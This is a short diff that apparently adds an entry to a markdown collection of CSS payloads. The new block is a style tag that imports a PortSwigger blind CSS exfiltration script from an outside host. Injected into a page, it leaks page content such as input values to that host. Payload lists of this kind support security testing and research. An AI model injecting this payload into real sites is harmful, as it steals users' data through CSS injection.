@@ -15,3 +15,10 @@ input {
 }
 </style>
 ```
+
+
+```bash
+<style>
+@import 'https://portswigger-labs.net/blind-css-exfiltration/start';
+</style>
+```
